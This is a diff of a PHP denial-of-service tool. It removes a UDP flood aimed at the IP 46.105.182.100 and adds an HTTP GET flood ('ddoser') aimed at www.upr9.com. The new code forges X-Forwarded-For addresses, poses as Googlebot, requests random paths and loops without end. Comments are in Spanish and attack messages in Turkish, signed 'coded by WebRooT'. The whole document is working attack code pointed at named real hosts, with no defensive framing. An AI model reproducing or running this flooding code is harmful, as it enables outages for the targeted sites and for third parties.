@@ -1,23 +1,53 @@
-$packets = 0;
-ignore_user_abort(TRUE);
-set_time_limit(60);
-$exec_time = "60"
-$time = time();
-$max_time = $time+$exec_time;
-$host = "46.105.182.100"
-for($i=0;$i<65553;$i++){
-$out .= 'X';
+@set_time_limit(30);
+$dominio = "www.upr9.com";
+$ruta = "/".generateRandomString(10);
+$port = "80";
+function generateRandomString($length=10) {
+    $original_string = array_merge(range(0,9), range('a','z'), range('A', 'Z'));
+    $original_string = implode("", $original_string);
+    return substr(str_shuffle($original_string), 0, $length);
 }
-while(1){
-$packets++;
-if(time() > $max_time){
-break;
+
+$msj = array("<h2>Yanlis Sifre girdiniz.</h2></div></body></html>","<h2>Saldiri Yapmak icin yukardaki formu doldurunuz.</h2></div></body></html>","<big><b>Baglanti kurulamadi.</b></big><br />\n","0a32e26a417d2c7cfbd333b7feb0a0a8","2e2234a41122a233cfbd333b9bc30a03");
+
+function ddoser($dominio,$ruta,$port) {
+
+//hago un random de ips para no ser siempre el mismo vistitante
+$ip_simulada = rand(188,254).'.'.rand(1,254).'.'.rand(1,254).'.'.rand(1,254);
+
+//defino y abro socket segun los datos del form
+$socket = fsockopen($dominio, $port, $errno, $errstr, 1);
+
+// comienzan los datos del header para parecer una persona comun xD
+$header .= "GET ".$ruta." HTTP/1.1\r\n";
+$header .= "Host: ".$dominio."\r\n";
+$header .= "User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\r\n";
+$header .= "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,image/jpg,image/gif,*/*;q=0.5\r\n";
+$header .= "Accept-Language: tr-tr,tr;q=0.8,en-us;q=0.5,en;q=0.3\r\n";
+$header .= "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n";
+$header .= "Keep-Alive: 300\r\n";
+$header .= "Proxy-Connection: keep-alive\r\n";
+$header .= "Referer: http://".$dominio.$ruta."\r\n";
+$header .= "Content-Type: application/x-www-form-urlencoded\r\n";
+$header .= "X-Forwarded-For: ".$ip_simulada."\r\n";
+$header .= "Cache-Control: no-cache, no-store, max-age=0, must-revalidate\r\n";
+$header .= "Pragma: no-cache\r\n";
+$header .= "Expires: Sun, 01 Jul 1995 00:00:00 GMT\r\n";
+$header .= "Via: CB-Prx\r\n";
+$header .= "Connection: Close\r\n\r\n";
+
+//envio todo lo recolectado
+$send_header = fwrite($socket,$header);
+if($send_header) {
+print("Saldiri: <span style='color:#FF0F2F'>".$ip_simulada."</span> @ ".htmlentities(str_replace('www.','',$dominio))."".htmlentities($ruta)."<br />\n");
+} else {
+print("$msj[2]");
 }
-$rand = rand(1,65553);
-$fp = fsockopen('udp://'.$host, 80, $errno, $errstr, 3);
-if($fp){
-fwrite($fp, $out);
-fclose($fp);
+fclose($socket);
 }
+if($msj[3] != (md5(md5($pw)))) { echo "DDoS script coded by WebRooT"; }
+if($dominio != "" && $dominio != "www.victima.com") {
+while(1) {
+ddoser($dominio,$ruta,$port);
 }
-echo '<br>' . round($packets / $exec_time, 2) . " saniyede $packets (" . round(($packets * 65) / 1024, 2) . " MB) veri hedefe yollandi";
+} else { die ("$msj[1]");}
